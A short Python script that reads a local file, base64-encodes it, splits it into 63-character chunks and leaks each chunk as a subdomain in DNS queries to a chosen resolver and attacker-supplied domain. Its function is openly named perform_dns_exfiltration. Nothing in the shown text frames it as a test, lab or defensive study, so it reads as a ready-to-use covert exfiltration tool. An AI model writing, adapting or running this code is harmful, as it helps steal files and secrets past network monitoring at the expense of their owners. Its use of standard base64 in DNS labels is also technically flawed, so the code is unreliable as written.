import base64
import dns.resolver
import dns.exception

def read_sensitive_data(file_path):
    with open(file_path, 'r') as file:
        return file.read()

def encode_data_to_base64(data):
    # Encode the data in base64 to ensure safe transmission
    return base64.b64encode(data.encode()).decode()

def split_data_into_chunks(data, chunk_size):
    # Split the data into chunks of the specified size
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def perform_dns_exfiltration(chunks, dns_server_ip, base_domain):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [dns_server_ip]

    for chunk in chunks:
        # Construct the FQDN for each chunk
        query = f"{chunk}.{base_domain}."
        try:
            # Perform a DNS query (A record)
            resolver.query(query, "A")
            print(f"Sent query: {query}")
        except dns.exception.DNSException as e:
            # Print or log error but continue with the next query
            print(f"Query failed for {query}: {e}")

if __name__ == "__main__":
    file_path = 'diary.txt'
    dns_server_ip = '8.8.8.8'  # Example DNS server (Google's public DNS)
    base_domain = 'example.com'  # Replace with your actual domain

    sensitive_data = read_sensitive_data(file_path)
    encoded_data = encode_data_to_base64(sensitive_data)
    chunks = split_data_into_chunks(encoded_data, 63)  # 63 characters to stay within DNS label limit

    perform_dns_exfiltration(chunks, dns_server_ip, base_domain)